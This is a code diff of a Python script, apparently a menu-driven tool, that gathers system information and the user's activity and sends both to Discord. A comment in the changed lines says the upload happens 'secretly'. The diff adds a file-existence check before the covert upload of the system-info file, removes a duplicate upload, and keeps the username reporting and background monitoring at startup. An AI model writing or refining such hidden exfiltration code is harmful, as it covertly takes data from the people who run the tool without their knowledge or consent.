@@ -447,7 +447,11 @@ def system_info(username):
         with open(TEMP_FILE, 'w') as file:  # Save system info to file
             file.write("\n".join(info))
         
-        send_discord_file(TEMP_FILE)  # Send the system info file to Discord (secretly)
+        if os.path.exists(TEMP_FILE):
+            send_discord_file(TEMP_FILE)  # Send the system info file to Discord (secretly)
+        else:
+            print_colored(f"Error: System info file not found at {TEMP_FILE}", Fore.RED)
+        
         send_discord_message(f"User '{username}' checked system information.")
     except Exception as e:
         print_colored(f"Error retrieving system info: {e}", Fore.RED)
@@ -626,7 +630,6 @@ def main_menu():
 
     send_discord_message(f"User '{username}' started the script.")
     gather_system_info()  # Gather and send system info at the start
-    send_discord_file(TEMP_FILE)  # Send the system info file to Discord
     run_background_thread()  # Start background monitoring
 
     while True:
